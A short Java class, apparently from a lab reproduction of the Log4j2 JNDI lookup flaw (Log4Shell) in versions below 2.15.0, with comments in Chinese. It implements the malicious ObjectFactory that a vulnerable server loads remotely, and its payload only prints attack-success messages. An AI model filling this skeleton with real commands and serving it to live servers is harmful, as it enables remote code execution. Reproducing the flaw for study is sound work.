package org.redcrazyghost.TEST;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

/**
 * 测试log4j注入 2.15.0版本以下
 * log4j2 lookup 漏洞 复现
 * @author wenxingzhan
 * @date 2021/12/12 18:53
 **/
public class attck implements ObjectFactory {
    {
        System.out.println("静态代码攻击");
    }
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        System.out.println("成功攻击！");
        return "攻击！";
    }
}
